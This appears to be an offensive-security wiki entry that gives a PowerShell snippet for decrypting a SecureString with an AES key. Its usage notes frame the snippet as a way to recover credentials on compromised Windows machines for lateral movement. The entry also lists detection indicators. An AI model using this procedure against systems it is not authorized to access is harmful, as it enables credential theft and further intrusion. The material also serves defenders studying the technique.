---
id: 11f903db-70f9-4ae5-9ac9-968b5c1e496b
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:31.187186+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - powershell
  - decryption
  - secure-string
  - credential-access
validated: true
---

# PowerShell-Decrypt-SecureString-with-AES-Key

## Code

```powershell
$aesKey = (49, 222, 253, 86, 26, 137, 92, 43, 29, 200, 17, 203, 88, 97, 39, 38, 60, 119, 46, 44, 219, 179, 13, 194, 191, 199, 78, 10, 4, 40, 87, 159)
$secureObject = ConvertTo-SecureString -String "76492d11167[SNIP]MwA4AGEAYwA1AGMAZgA=" -Key $aesKey
$decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject)
$decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted)
```

## Description

This PowerShell code decrypts a Secure String encrypted with a specific AES key, converting it to plaintext. It is used in post-exploitation scenarios to recover stored credentials from Windows systems, such as those in Credential Manager or registry entries.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $aesKey | 32-byte AES encryption key as an integer array | (49, 222, 253, ...) |
| $secureObject (input) | Encrypted Secure String (base64-encoded) | "76492d11167[SNIP]MwA4AGEAYwA1AGMAZgA=" |
| $decrypted | Output plaintext string containing the credential | "username:password" |

## Usage

Embed this code in a PowerShell script executed locally or remotely via WinRM on a compromised Windows machine. Replace the encrypted string with the actual value from storage. Use the resulting $decrypted variable to create PSCredential objects for further actions like lateral movement.

## Detection

- Monitor PowerShell Script Block Logging for ConvertTo-SecureString and Marshal API calls.
- Look for unusual access to credential storage paths in event logs (Event ID 4657 for registry).
- Network indicators if executed remotely via PowerShell Remoting (WinRM traffic on port 5985/5986).

## Related

- [[procedures/Windows-Credentials-Decryption-using-PowerShell-Secure-String]]
